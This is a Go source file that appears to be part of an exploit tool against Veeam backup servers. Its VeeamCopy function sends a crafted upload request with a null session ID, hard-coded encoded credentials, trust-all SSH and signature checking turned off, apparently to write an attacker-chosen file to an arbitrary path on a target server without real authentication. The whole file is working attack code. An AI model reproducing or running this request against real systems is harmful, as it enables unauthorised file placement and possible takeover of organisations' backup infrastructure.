package v11

import "errors"

func VeeamCopy(target, sourceFile, targetFile string) error {
	vrequest := RequestData{
		FISpec: UploadRequest{
			RequestSpec: RequestSpec{
				FIScope:     190,
				FIMethod:    25,
				FISessionID: "00000000-0000-0000-0000-000000000000",
			},
			SystemType:                 "WIN",
			Host:                       "127.0.0.1",
			User:                       "Av2XMhjKZY4=",
			Password:                   "Av2XMhjKZY4=",
			TaskType:                   "Package",
			SshCredentials:             "Av2XMhjKZY4=",
			SshFingerprint:             "0000",
			SshTrustAll:                true,
			IsWindows:                  true,
			IsFix:                      true,
			CheckSignatureBeforeUpload: false,
			DefaultProtocol:            3,
			FileRelativePath:           targetFile,
			FileProxyPath:              sourceFile,
			FileRemotePath:             targetFile,
			HostIps: HostIps{
				String: []String{{Value: "127.0.0.1"}},
			},
		},
	}
	var uploadReply UploadReply
	err := SendRequest(target, vrequest, &uploadReply)
	if err != nil {
		return err
	}
	if uploadReply.HasExceptions() {
		errTxt := ""
		for _, exception := range uploadReply.PlainException.KeyValue {
			errTxt += exception.Key + " : " + exception.Value + "\n"
		}
		return errors.New(errTxt)
	}
	return nil
}
